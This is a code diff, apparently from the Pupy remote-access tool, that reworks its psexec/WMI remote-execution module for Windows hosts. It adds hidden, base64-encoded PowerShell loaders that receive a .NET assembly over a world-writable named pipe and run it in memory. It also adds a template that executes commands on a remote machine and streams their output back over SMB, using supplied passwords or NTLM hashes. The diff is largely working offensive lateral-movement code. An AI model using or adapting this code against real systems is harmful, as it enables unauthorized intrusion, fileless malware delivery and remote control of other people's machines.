@@ -19,6 +19,7 @@ from StringIO import StringIO
 from base64 import b64encode
 from hashlib import md5
 from threading import Thread
+from contextlib import contextmanager
 
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
@@ -30,7 +31,9 @@ from impacket.system_errors import \
      ERROR_SERVICE_DOES_NOT_EXIST, ERROR_SERVICE_NOT_ACTIVE, \
      ERROR_SERVICE_REQUEST_TIMEOUT
 from impacket.smbconnection import SMBConnection, SessionError, SMB_DIALECT
-from impacket.smb3structs import FILE_WRITE_DATA, FILE_APPEND_DATA
+from impacket.smb3structs import (
+    FILE_READ_DATA, FILE_WRITE_DATA, FILE_APPEND_DATA
+)
 
 from sys import getdefaultencoding
 
@@ -68,7 +71,10 @@ class PsExecException(Exception):
 
 PIPE_LOADER_TEMPLATE = '''
 $ps=new-object System.IO.Pipes.PipeSecurity;
-$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0);
+$all=New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0");
+$acl=new-object System.IO.Pipes.PipeAccessRule($all,"FullControl","Allow");
+$ps.AddAccessRule($acl);
+$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0,$ps);
 $p.WaitForConnection();
 $x=new-object System.IO.BinaryReader($p);
 $a=$x.ReadBytes({size});
@@ -76,7 +82,61 @@ $x.Close();
 [Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
 '''
 
-PIPE_LOADER_CMD_TEMPLATE = '{powershell} -w hidden -EncodedCommand "{cmd}"'
+PIPE_STDOUT_TEMPLATE = '''
+Start-Transcript -Path "C:\\tmp\\d3.log" -Force;
+$ps=new-object System.IO.Pipes.PipeSecurity;
+$all=New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0");
+$acl=new-object System.IO.Pipes.PipeAccessRule($all,"FullControl","Allow");
+$ps.AddAccessRule($acl);
+$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","Out",2,"Byte",0,0,{size},$ps);
+$p.WaitForConnection();
+$x=new-object System.IO.BinaryWriter($p);
+$StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{{
+    FileName = '{arg0}';
+    Arguments = '{argv}';
+    UseShellExecute = $false;
+    RedirectStandardOutput = $true;
+    RedirectStandardError = $true;
+}};
+
+$Process = New-Object System.Diagnostics.Process;
+$Process.StartInfo = $StartInfo;
+
+$enc = [system.Text.Encoding]::UTF8;
+
+$OutEvent = Register-ObjectEvent -Action {{
+    $bytes = $enc.GetBytes($Event.SourceEventArgs.Data);
+    Write-Host $Event.SourceEventArgs.Data;
+    $x.Write($bytes);
+    $x.Flush();
+}} -InputObject $Process -EventName OutputDataReceived;
+
+$ErrEvent = Register-ObjectEvent -Action {{
+    Write-Host $Event.SourceEventArgs.Data;
+    $x.Write($enc.GetBytes($Event.SourceEventArgs.Data));
+    $x.Flush();
+}} -InputObject $Process -EventName ErrorDataReceived;
+
+$Process.Start();
+$Process.WaitForExit();
+
+$Process.BeginOutputReadLine();
+$Process.BeginErrorReadLine();
+
+do
+{{
+    Start-Sleep -Seconds 1;
+}}
+while (!$Process.HasExited);
+
+$OutEvent.Name, $ErrEvent.Name |
+    ForEach-Object {{Unregister-Event -SourceIdentifier $_}};
+
+$x.Close();
+Write-Host "EXIT";
+'''
+
+POWERSHELL_CMD_TEMPLATE = '{powershell} -w hidden -EncodedCommand "{cmd}"'
 POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
 PERM_DIR       = ''.join(random.sample(string.ascii_letters, 10))
@@ -105,7 +165,15 @@ def generate_loader_cmd(size):
     pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
     encoded = b64encode(PIPE_LOADER_TEMPLATE.format(
         pipename=pipename, size=size).encode('utf-16le'))
-    cmd = PIPE_LOADER_CMD_TEMPLATE.format(powershell=POWERSHELL_PATH, cmd=encoded)
+    cmd = POWERSHELL_CMD_TEMPLATE.format(powershell=POWERSHELL_PATH, cmd=encoded)
+    return cmd, pipename
+
+
+def generate_stdo_cmd(arg0, argv):
+    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+    encoded = b64encode(PIPE_STDOUT_TEMPLATE.format(
+        pipename=pipename, size=1024, arg0=arg0, argv=' '.join(argv)).encode('utf-16le'))
+    cmd = POWERSHELL_CMD_TEMPLATE.format(powershell=POWERSHELL_PATH, cmd=encoded)
     return cmd, pipename
 
 
@@ -256,9 +324,11 @@ class ConnectionInfo(object):
         )
 
     def create_wbem(self, namespace='//./root/cimv2', rpc_auth_level=None):
+        print "create_wbem #1"
         if self._wbem_conn:
             return self._wbem_conn
 
+        print "create_wbem #2"
         key = None
         if self._use_cache:
             key = self._cache_key_entry()
@@ -266,6 +336,8 @@ class ConnectionInfo(object):
                 self._dcom_conn, self._wbem_conn = WBEM_SESSIONS_CACHE[key]
                 self._cached = True
                 return self._wbem_conn
+
+        print "CREATE WBEM", self.host
 
         dcom = DCOMConnection(
             self.host, self.user, self.password, self.domain,
@@ -276,7 +348,7 @@ class ConnectionInfo(object):
         try:
             iInterface = dcom.CoCreateInstanceEx(
                 wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
-                )
+            )
 
             iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
 
@@ -354,7 +426,9 @@ class ConnectionInfo(object):
                 return self._smb_conn
 
         try:
-            smb = SMBConnection(self.host, self.host, None, self.port, timeout=self.timeout)
+            smb = SMBConnection(
+                self.host, self.host, None, self.port, timeout=self.timeout
+            )
 
             if self.kerberos:
                 smb.kerberos_login(
@@ -389,6 +463,31 @@ class ConnectionInfo(object):
         except Exception, e:
             error = '{}: {}\n{}'.format(type(e).__name__, e, traceback.format_exc())
             raise PsExecException(error)
+
+
+class SMBPipeObject(object):
+    __slots__ = ('conn', 'tid', 'fid')
+
+    def __init__(self, conn, tid, fid):
+        self.conn = conn
+        self.tid = tid
+        self.fid = fid
+
+    def write(self, data, wait=True):
+        self.conn.writeNamedPipe(self.tid, self.fid, data, wait)
+
+    def read(self, amount=None):
+        print "READ..", amount
+        try:
+            data = self.conn.readNamedPipe(self.tid, self.fid, amount)
+        except SessionError as e:
+            if e.getErrorCode() == 0xc000014b:
+                return None
+            else:
+                raise
+
+        print "READ: ", len(data)
+        return data
 
 
 class FileTransfer(object):
@@ -436,6 +535,33 @@ class FileTransfer(object):
         except Exception, e:
             self._exception = e
             return []
+
+    @contextmanager
+    def open_pipe(self, path, mode, timeout=600, shareMode=0):
+        tid = self._conn.connectTree('IPC$')
+        pipeReady = False
+
+        for _ in xrange(timeout):
+            try:
+                self._conn.waitNamedPipe(tid, '\\' + path)
+                pipeReady = True
+                break
+
+            except:
+                time.sleep(1)
+                pass
+
+        if not pipeReady:
+            # Last try, will raise
+            self._conn.waitNamedPipe(tid, '\\' + path)
+
+        fid = self._conn.openFile(
+            tid, path, mode, shareMode=shareMode)
+
+        try:
+            yield SMBPipeObject(self._conn, tid, fid)
+        finally:
+            self._conn.closeFile(tid, fid)
 
     def ls(self, share, path):
         self._exception = None
@@ -530,35 +656,11 @@ class FileTransfer(object):
             self._exception = e
 
     def push_to_pipe(self, pipe, data, timeout=90):
-        tid = self._conn.connectTree('IPC$')
-        pipeReady = False
-
-        for _ in xrange(timeout):
-            try:
-                self._conn.waitNamedPipe(tid, '\\' + pipe)
-                pipeReady = True
-                break
-
-            except:
-                time.sleep(1)
-                pass
-
-        if not pipeReady:
-            self._conn.waitNamedPipe(tid, '\\' + pipe)
-
-        fid = self._conn.openFile(
-            tid, pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, shareMode=0)
-
-        try:
+        with self.open_pipe(pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, timeout) as pipe:
             # Write by small chunks (1.4 KB)
             # Slow, but should work with crappy networks
             for offset in xrange(0, len(data), 1400):
-                self._conn.writeNamedPipe(
-                    tid, fid,
-                    data[offset:offset+1400]
-                )
-        finally:
-            self._conn.closeFile(tid, fid)
+                pipe.write(data[offset:offset+1400])
 
     def close(self):
         if self._conn and not self._cached:
@@ -575,7 +677,7 @@ class ShellServiceIsNotExists(Exception):
 
 class ShellService(object):
     __slots__ = (
-        '_scHandle', '_serviceHandle', '_scmr', '_name'
+        '_scHandle', '_serviceHandle', '_scmr', '_name', '_stdout'
     )
 
     def __init__(self, rpc, name=SERVICE_NAME):
@@ -586,6 +688,7 @@ class ShellService(object):
 
         self._scmr = rpc
         self._scmr.bind(scmr.MSRPC_UUID_SCMR)
+        self._stdout = None
 
         resp = scmr.hROpenSCManagerW(self._scmr)
         self._scHandle = resp['lpScHandle']
@@ -602,17 +705,15 @@ class ShellService(object):
             else:
                 raise
 
-    def create(self, command, output=None):
+    def create(self, command, stdout=False):
         if self._serviceHandle:
             raise ShellServiceAlreadyExists()
 
-        if output:
-            command = ' & '.join([
-                '%COMSPEC% /Q /c echo {} ^> {} 2^>^&1 > {}'.format(
-                    command, output, BATCH_FILENAME),
-                '%COMSPEC% /Q /c {}'.format(BATCH_FILENAME),
-                'del {}'.format(BATCH_FILENAME)
-            ])
+        if stdout:
+            parts = command.split(' ', 1)
+            argv0, argv = parts[0], parts[1:]
+
+            command, self._stdout = generate_stdo_cmd(argv0, argv)
 
         resp = scmr.hRCreateServiceW(
             self._scmr,
@@ -647,6 +748,10 @@ class ShellService(object):
 
         resp = scmr.hRQueryServiceStatus(self._scmr, self._serviceHandle)
         return resp['lpServiceStatus']['dwCurrentState']
+
+    @property
+    def stdout(self):
+        return self._stdout
 
     @property
     def exists(self):
@@ -686,55 +791,127 @@ def create_filetransfer(*args, **kwargs):
         return None, e.as_unicode(kwargs.get('codepage', None)) + ' CREDS:{}'.format(info.credentials)
 
 
-def sc(conninfo, command, output=True):
+def sc(conninfo, command, output=True, on_data=None):
     rpc = conninfo.create_pipe_dce_rpc(r'\pipe\svcctl')
     service = ShellService(rpc)
     if service.exists:
         service.destroy()
 
-    output_filename = None
-    if output:
-        output_filename = '\\'.join([
-            r'\Windows\Temp', ''.join(random.sample(string.ascii_letters, 10))
-        ])
-
-    if not service.create(command, output_filename):
+    if not service.create(command, output):
         raise PsExecException('Could not create service')
 
-    running = service.start()
-    if running and conninfo.timeout:
+    timeout = None
+    ft = None
+
+    if conninfo.timeout:
         timeout = time.time() + conninfo.timeout
 
-        while service.active:
-            time.sleep(1)
-            if timeout is not None and time.time() >= timeout:
-                break
+    output_data = []
 
+    try:
+        if output:
+            ft = FileTransfer(
+                conninfo.create_smb_connection(), conninfo.cached
+            )
+
+            with ft.open_pipe(service.stdout, FILE_READ_DATA, conninfo.timeout) as pipe:
+                running = service.start()
+                if not running:
+                    return None
+
+                while service.active:
+                    chunk = pipe.read(1024)
+                    if not chunk:
+                        break
+
+                    if on_data:
+                        on_data(True, chunk)
+                    else:
+                        output_data.append(chunk)
+
+                    if timeout is not None and time.time() >= timeout:
+                        break
+
+        else:
+            running = service.start()
+            if not running:
+                return None
+
+            while service.active:
+                if timeout is not None and time.time() >= timeout:
+                    break
+                time.sleep(1)
+    finally:
         service.destroy()
 
-    return output_filename
+    return ''.join(output_data), ft
 
 
-def wmiexec(conninfo, command, share='C$', output=True):
-    output_filename = None
+def wmiexec(conninfo, command, output=True, on_data=None):
+    timeout = None
+
+    if conninfo.timeout:
+        timeout = time.time() + conninfo.timeout
 
     iWbemServices = conninfo.create_wbem()
-    win32Process, _ = iWbemServices.GetObject('Win32_Process')
-    if output:
-        output_filename = '\\'.join([
-            r'\Windows\Temp', ''.join(random.sample(string.ascii_letters, 10))
-        ])
 
-        command = r'cmd.exe /Q /c {} 2>&1 1> \\127.0.0.1\{}\{}'.format(
-            command, share, output_filename
+    if on_data:
+        on_data(False, 'Connected to WMI')
+
+    win32Process, _ = iWbemServices.GetObject('Win32_Process')
+
+    output_data = []
+    ft = None
+
+    if output:
+        parts = command.split(' ', 1)
+        argv0, argv = parts[0], parts[1:]
+
+        command, stdout = generate_stdo_cmd(argv0, argv)
+
+        ft = FileTransfer(
+            conninfo.create_smb_connection(), conninfo.cached
         )
 
-    iResultClassObject = win32Process.Create(command, r'C:\Windows\Temp', None)
-    result = iResultClassObject.ReturnValue
-    if result == 0:
-        return output_filename
+        iResultClassObject = win32Process.Create(command, 'C:\\', None)
+        result = iResultClassObject.ReturnValue
+        if result:
+            raise PsExecException('Win32_Process.Create failed: {}'.format(result))
+
+        if on_data:
+            on_data(False, '{} -> {}'.format(command, iResultClassObject.ProcessId))
+
+        if on_data:
+            on_data(False, 'Connecting to stdout pipe {}'.format(stdout))
+
+        with ft.open_pipe(stdout, FILE_READ_DATA, conninfo.timeout) as pipe:
+
+            if on_data:
+                on_data(False, 'Connected to stdout')
+
+            while True:
+                chunk = pipe.read(1024)
+                if not chunk:
+                    break
+
+                if on_data:
+                    on_data(True, chunk)
+                else:
+                    output_data.append(chunk)
+
+                if timeout is not None and time.time() >= timeout:
+                    break
     else:
-        raise PsExecException('Win32_Process.Create failed: {}'.format(result))
+        iResultClassObject = win32Process.Create(command, 'C:\\', None)
+
+        if iResultClassObject.ReturnValue:
+            raise PsExecException(
+            'Win32_Process.Create failed: {}'.format(iResultClassObject.ReturnValue))
+        elif on_data:
+            if on_data:
+                on_data(False, '{} -> {}'.format(command, iResultClassObject.ProcessId))
+
+    return ''.join(output_data), ft
 
 
 def wql(
@@ -800,87 +977,99 @@ def check(host, port, user, domain, password, ntlm, timeout=30):
     return True
 
 
-def _smbexec(
-    conninfo, command, share='C$', execm='smbexec',
-        codepage=None, output=True, on_exec=None):
+def _psexec(
+    conninfo, command, execm='smbexec',
+        codepage=None, output=True,
+        on_exec=None, on_data=None, on_complete=None, verbose=False):
 
-    filename = None
+    result = None
     ft = None
     smbc = None
 
-    if execm == 'smbexec':
-        filename = sc(conninfo, command, output)
+    if on_data and verbose:
+        on_data('PSExec thread started')
 
-    elif execm == 'wmi':
-        filename = wmiexec(conninfo, command, share, output)
+    def _on_data(is_output, data):
+        if data:
+            if codepage:
+                data = data.decode(codepage)
 
-    else:
-        raise ValueError('Unknown execution method, knowns are smbexec/wmi')
+            if is_output or verbose:
+                on_data(data)
 
-    if on_exec:
-        if not smbc:
-            smbc = conninfo.create_smb_connection()
+    try:
+        with conninfo:
+            if execm == 'smbexec':
+                result, ft = sc(
+                    conninfo, command, output, _on_data if on_data else None
+                )
 
-        if not ft:
-            ft = FileTransfer(smbc, cached=True)
+            elif execm == 'wmi':
+                result, ft = wmiexec(
+                    conninfo, command, output, _on_data if on_data else None
+                )
 
-        on_exec(ft)
+            else:
+                raise ValueError('Unknown execution method, knowns are smbexec/wmi')
 
-    if filename:
-        if not ft:
-            if not smbc:
-                smbc = conninfo.create_smb_connection()
+            if on_exec:
+                if not ft:
+                    smbc = conninfo.create_smb_connection()
+                    ft = FileTransfer(smbc, cached=True)
 
-            ft = FileTransfer(smbc, cached=True)
+                on_exec(ft)
 
-        buf = StringIO()
-        for retry in xrange(5):
-            ft.get(share, filename, buf.write)
-            if not ft.ok and 'share access flags' in ft.error:
-                time.sleep(retry)
-                continue
+            if result:
+                if codepage:
+                    result = result.decode(codepage)
 
-            break
+    except PsExecException as e:
+        if on_complete:
+            on_complete(e.as_unicode(codepage))
 
-        if not ft.ok:
-            return None, ft.error + ' (args: share={} filename={})'.format(
-                share, filename)
+    except SessionError as e:
+        if on_complete:
+            on_complete('{}:{} {}'.format(conninfo.host, conninfo.port, e))
 
-        ft.rm(share, filename)
-        value = buf.getvalue()
+    except Exception as e:
+        if on_complete:
+            on_complete(
+                '{}:{} {}: {}\n{}'.format(
+                    conninfo.host,
+                    conninfo.port,
+                    type(e).__name__, e,
+                    traceback.format_exc()))
 
-        if codepage:
-            value = value.decode(codepage)
+    finally:
+        if on_data and verbose:
+            on_data('PSExec thread completed')
 
-        return value, ft.error
+        if on_complete:
+            on_complete(None)
 
-    return None, None
 
-
-def smbexec(
+def psexec(
         host, port,
         user, domain,
         password, ntlm,
-        command, share='C$', execm='smbexec',
-        codepage=None, timeout=30, output=True, on_exec=None):
+        command, execm='smbexec',
+        codepage=None, timeout=30, output=True, on_exec=None,
+        on_data=None, on_complete=None, verbose=False):
 
     conninfo = ConnectionInfo(
         host, port, user, domain, password, ntlm, timeout=timeout
     )
 
-    with conninfo:
-        try:
-            return _smbexec(conninfo, command, share, execm, codepage, output, on_exec)
-
-        except PsExecException as e:
-            return None, e.as_unicode(codepage)
-
-        except SessionError as e:
-            return None, '{}:{} {}'.format(host, port, e)
-
-        except Exception as e:
-            return None, '{}:{} {}: {}\n{}'.format(
-                host, port, type(e).__name__, e, traceback.format_exc())
+    worker = Thread(
+        target=_psexec,
+        args=(
+            conninfo,
+            command, execm, codepage, output,
+            on_exec, on_data, on_complete, verbose
+        )
+    )
+    worker.daemon = True
+    worker.start()
 
 
 def get_cache():
@@ -940,6 +1129,13 @@ def pupy_smb_exec(
             log_cb(None, 'Thread started (pipe={}, payload={}, md5={})'.format(
                 pipename, size, md5(payload).hexdigest()))
 
+        def _on_complete(error):
+            if log_cb:
+                if error:
+                    log_cb(False, 'PSExec failed: {}'.format(error))
+                else:
+                    log_cb(True, 'PSExec: process exited')
+
         def _push_payload(ft):
             if log_cb:
                 log_cb(None, 'Connected to {}:{} (user={}, os={})'.format(
@@ -949,30 +1145,34 @@ def pupy_smb_exec(
             try:
                 ft.push_to_pipe(pipename, payload, timeout=timeout)
                 if log_cb:
-                    log_cb(True, 'Payload flushed')
+                    log_cb(None, 'Payload flushed')
 
             except Exception, e:
                 if log_cb:
-                    log_cb(False, '{}: {}'.format(
+                    import traceback
+                    log_cb(None, '{}: {}'.format(
                         e, traceback.format_exc()))
 
         try:
-            _, error = smbexec(
-                host, port,
-                user, domain,
-                password, ntlm,
-                cmd, execm=execm,
-                timeout=timeout,
-                output=False,
-                on_exec=_push_payload)
 
-            if error:
-                if log_cb:
-                    log_cb(False, 'Smbexec failed: {})'.format(error))
+            conninfo = ConnectionInfo(
+                host, port, user, domain, password, ntlm, timeout=timeout
+            )
+
+            _psexec(
+                conninfo,
+                cmd, execm=execm,
+                output=False,
+                on_exec=_push_payload,
+                on_complete=_on_complete
+            )
 
         except Exception, e:
             if log_cb:
-                log_cb(False, 'Communication failed: {})'.format(e))
+                import traceback
+                log_cb(
+                    False, 'Communication failed: {} {} {} {})'.format(
+                        e, type(e), dir(e), traceback.format_exc()))
 
     worker = Thread(
         target=_loader,
